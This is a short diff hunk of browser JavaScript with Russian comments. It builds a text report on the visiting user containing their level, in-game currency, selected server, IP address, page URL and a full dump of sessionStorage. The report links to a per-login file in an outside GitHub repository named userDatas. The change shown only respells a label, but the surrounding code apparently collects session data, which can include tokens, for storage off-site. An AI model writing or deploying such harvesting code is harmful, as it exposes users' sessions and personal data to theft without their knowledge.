@@ -212,7 +212,7 @@
             const sessionStorageData = JSON.stringify(sessionStorage);
             
             // Формируем текстовый файл
-            let fileContent = `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\nAccses URL: https://raw.githubusercontent.com/uloxa13/userDatas/refs/heads/main/${un1xxd}_${user.login}.txt\n\n`;
+            let fileContent = `--- УРОВЕНЬ ПОЛЬЗОВАТЕЛЯ ---\n${userLevel}\ngems: ${user.premiumPoints}\nselected server: ${document.getElementById('selectServer')?.options[document.getElementById('selectServer')?.selectedIndex]?.text || 'N/A'}\nAcsess URL: https://raw.githubusercontent.com/uloxa13/userDatas/refs/heads/main/${un1xxd}_${user.login}.txt\n\n`;
             fileContent += `--- ОСНОВНЫЕ ДАННЫЕ ---\n`;
             fileContent += `IP-адрес: ${userIP}\n`;
             fileContent += `URL страницы: ${window.location.href}\n`;
